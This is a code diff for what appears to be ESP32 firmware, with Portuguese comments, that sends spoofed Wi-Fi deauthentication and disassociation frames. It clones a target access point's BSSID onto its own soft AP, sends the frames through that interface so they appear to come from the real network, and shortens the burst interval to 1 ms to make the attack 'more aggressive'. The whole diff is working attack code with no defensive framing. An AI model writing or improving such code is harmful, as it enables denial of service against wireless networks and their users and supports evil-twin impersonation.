@@ -27,6 +27,7 @@ static uint8_t cloneHealthCheckFailures = 0;
 
 // ============================================================
 // RAW FRAME DEAUTH
+// Envia pela WIFI_IF_AP para que o MAC de origem seja o BSSID spoofado
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
@@ -42,14 +43,14 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     frame[2] = 0x00;
     frame[3] = 0x00;
 
-    // DA - Destination Address
+    // DA - Destination Address (cliente ou broadcast)
     if (clientMac) {
         memcpy(&frame[4], clientMac, 6);
     } else {
         memset(&frame[4], 0xFF, 6); // Broadcast
     }
 
-    // SA - Source Address (BSSID do AP alvo)
+    // SA - Source Address = BSSID do AP alvo (spoofado no nosso AP)
     memcpy(&frame[10], bssid, 6);
 
     // BSSID
@@ -65,8 +66,8 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     frame[24] = 0x07;
     frame[25] = 0x00;
 
-    // auto_seq=true evita warning do driver
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
+    // ENVIA PELA INTERFACE AP (MAC ja esta spoofado para o BSSID alvo)
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
@@ -99,7 +100,8 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     frame[24] = 0x08;
     frame[25] = 0x00;
 
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
+    // ENVIA PELA INTERFACE AP
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
@@ -215,7 +217,6 @@ static void startBssidClone(uint8_t networkIndex) {
     WiFi.softAPdisconnect(true);
     delay(400);
 
-    // MODO AP_STA - ambas interfaces existem
     WiFi.mode(WIFI_AP_STA);
     delay(300);
 
@@ -320,9 +321,9 @@ void stopDeauth() {
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // === ENVIO CONTINUO ===
+    // === ENVIO CONTINUO - mais agressivo: 1ms entre bursts ===
     static unsigned long lastDeauthTx = 0;
-    if (millis() - lastDeauthTx >= 3) {
+    if (millis() - lastDeauthTx >= 1) {
         lastDeauthTx = millis();
 
         static uint8_t txRound = 0;
